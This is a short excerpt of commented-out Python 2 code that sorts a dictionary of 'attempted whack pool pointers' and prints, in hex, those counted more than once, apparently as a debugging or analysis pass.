# Pass 2...list the multiples...sorted_by_key = attempted_whack_pool_pointers.keys()
# Pass 2...list the multiples...sorted_by_key.sort()
# Pass 2...list the multiples...for whacked_pool_pointer in sorted_by_key:
# Pass 2...list the multiples...    if (attempted_whack_pool_pointers[whacked_pool_pointer] > 1):
# Pass 2...list the multiples...        print "0x%8x --> %d" % (whacked_pool_pointer, attempted_whack_pool_pointers[whacked_pool_pointer])
# Pass 2...list the multiples...print "==================================================================================================================="

